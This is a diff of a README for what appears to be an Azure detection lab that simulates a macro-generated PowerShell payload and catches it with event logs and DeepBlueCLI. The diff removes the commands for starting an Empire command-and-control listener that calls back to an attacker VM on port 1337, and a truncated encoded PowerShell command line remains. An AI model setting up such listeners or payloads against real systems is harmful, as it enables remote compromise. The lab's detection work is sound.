@@ -15,22 +15,8 @@ This project simulates the execution of a macro-generated PowerShell payload fro
 ## 🧪 Steps Performed
 
 ### 1. Setup in Azure
-- Deployed Kali Linux 2024.2 (Empire installed)
 - Deployed Windows 10/11 VM with Microsoft Excel and logging enabled
 - Ensured both VMs are on the same virtual network with allowed port access (default: 1337)
-
-### 2. Start Empire Listener on Kali
-```bash
-cd /opt/Empire
-sudo ./empire
-```
-
-Inside Empire:
-```bash
-uselistener http
-set Host http://<KALI-IP>:1337
-execute
-```
 
 ### 3. Generate PowerShell Macro Payload
 ```bash
@@ -84,8 +70,11 @@ Command Line: powershell.exe -enc JAB...
 
 ## 📸 Screenshots
 Add your screenshots to the `/screenshots` folder:
-- `macro_code.png`: VBA macro in Excel
+- `macro_code.png`: VBA macro in cmd
+![image](https://github.com/user-attachments/assets/f4bfdf44-e4d4-4648-8631-5cab3f0d2c4c)
+
 - `empire_listener.png`: Empire receiving the callback
+
 - `event_log_4104.png`: Event Viewer showing suspicious PowerShell
 - `deepbluecli_output.png`: Output from DeepBlueCLI
 
